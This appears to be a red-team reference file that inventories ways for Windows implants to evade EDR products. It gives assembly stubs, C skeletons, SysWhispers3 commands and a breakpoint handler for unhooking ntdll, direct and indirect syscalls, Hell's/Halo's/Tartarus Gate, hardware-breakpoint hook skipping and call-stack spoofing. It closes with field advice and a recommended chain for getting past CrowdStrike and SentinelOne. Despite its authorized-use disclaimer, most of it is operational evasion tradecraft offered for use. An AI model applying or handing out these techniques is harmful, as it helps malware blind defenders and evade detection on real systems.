# Unhook / Direct / Indirect Syscall Technique Inventory

> Authorized red team / adversarial exercises / own-product testing only; use against unauthorized targets is forbidden.

This document summarizes the current mainstream "bypass user-mode hooks" techniques, from the classic unhook to the newest hardware breakpoint Blindside.
All techniques map to MITRE ATT&CK T1562.001 / T1027 / T1055 for easy report output.

## 1. Peruns Fart / Fresh Ntdll from Disk

### Concept

The EDR's hooks all live in **the ntdll.dll currently mapped in process memory**. The `C:\Windows\System32\ntdll.dll` on disk is clean.
So as long as you re-map the disk ntdll into the current process and overwrite the in-memory `.text` section, the hooks are wiped out.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (contains EDR hook jmps) │ ◄── overwrite with the clean disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation Points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // use the native path to dodge monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Locate the .text section at the new address
// 5. NtProtectVirtualMemory to change the current ntdll .text to RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory to restore RX
```

### Caveats

- `NtProtectVirtualMemory` itself may be hooked → a chained problem. Fix: call `NtProtectVirtualMemory` via a **direct syscall** first
- Modern EDRs already monitor `NtProtectVirtualMemory` W operations on ntdll memory; pair with an ETW patch
- Under ETW-TI, Peruns Fart leaves `KERNEL_MODULE_LOAD` and `PROTECTVM` events — always suppress ETW first

## 2. Direct Syscall

### Concept

Do not call the ntdll exported functions; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (the value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps straight from user mode to the kernel SSDT, skipping any user-mode hook.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stub
syscallsstubs.std.x64.asm  - standard direct syscall
```

In Visual Studio:

```text
1. Add the .asm to the project and enable MASM (Custom Build Tool)
2. Include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) replacing the original NtAllocateVirtualMemory
```

### Minimal Direct Syscall to NtCreateFile (C Code Skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamically resolve the SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // (write some bytes here; omitted)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction lives in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry can easily see "syscall from non-ntdll address"
- This is exactly why the indirect syscall exists

## 3. Indirect Syscall

### Concept

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are controlled by us:

```text
Implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of some syscall;ret gadget inside ntdll>]   ; the syscall is not in the implant
```

The gadget you jump to is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
The kernel-mode ETW provider sees an ntdll RIP, matching legitimate behavior patterns.

### SysWhispers3 Indirect Mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns the ntdll syscall;ret address -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

These three are the evolution of "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is unhooked
- At implant startup, walk the `Nt*` exports of ntdll and extract the SSN from the first 4 bytes `mov eax, <SSN>`
- Pros: no hardcoded SSN; works across Windows versions
- Cons: if ntdll is already hooked (first byte becomes jmp), extraction fails

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is found to be hooked (not the standard prologue), **scan ±N functions up / down**
- Uses the fact that SSNs of `Nt*` functions in ntdll increase contiguously, inferring the hooked function's SSN from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is unreadable, look at the neighbors:
  The previous unhooked export's SSN = 0x17
  The next unhooked export's SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Handles the more advanced **hooks that change the SSN but keep the syscall instruction**
- Validates the SSN and the syscall;ret gadget address together
- Combining all three provides the most stable indirect syscall foundation

### Reference Implementation Locations (after the bootstrap git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (with fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Concept

Use the debug registers `DR0-DR3` to set hardware breakpoints at the entry of the EDR hook trampoline;
set up a VEH (Vectored Exception Handler) that, when the breakpoint hits, **moves RIP directly past the hook trampoline**,
skipping the EDR's detection code and landing on ntdll's real syscall section.

### Advantages

- No ntdll memory writes needed (no `NtProtectVirtualMemory` alert)
- No unhook needed (the hook is still there, just bypassed)
- ETW-TI cannot see the memory modification

### Implementation Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (at most 4, with single-step rotation)
// 3. SetThreadContext(thread, &ctx) writes DRx
// 4. When the EDR hook trampoline triggers a hardware breakpoint -> the VEH takes over
// 5. The VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN already in eax; R10 = RCX; jump to ntdll's syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- Each thread has independent DRx → multi-threaded programs must set them per thread
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass those first with the earlier techniques
- Win11 22H2+ introduces HVCI / some anti-debug mitigations that may interfere

## 6. Call Stack Spoofing

### The Problem

Modern EDRs call `RtlCaptureStackBackTrace` at the kernel entry of syscalls like `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
obtaining the full call stack to report. The implant's stack shows **non-image-backed memory** frames → high-confidence alerts.

### Option A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Before the syscall, swap the current thread's stack → a forged legitimate stack
2. Fill the forged frames with an all-legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After the syscall returns, swap back to the real stack

### Option B: SilentMoonwalk

More aggressive; uses a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restores → continue implant code
```

The key is unwinding: make `RtlVirtualUnwind` walk the forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Field OPSEC Advice

- Call stack spoof + indirect syscall + ETW patch is currently the more stable combination for getting past CrowdStrike / SentinelOne
- Spoof during the sleep stage too; spoofing only at execution time is not enough (the EDR samples periodically)

## 7. Technique Selection Comparison Table

| Technique | Counters | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | User-mode hooks | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hooks | Low | Low-Medium (kernel sees RIP in the implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hooks + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (foundational) | T1027 |
| HWBP Blindside | Hooks + no writes | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | Call stack telemetry | High | High | T1564 |

Field-recommended chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoints): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Callback

Unhooking is only half the bypass; the other half is telemetry blindness: continue into `references/telemetry-blinding.md`.
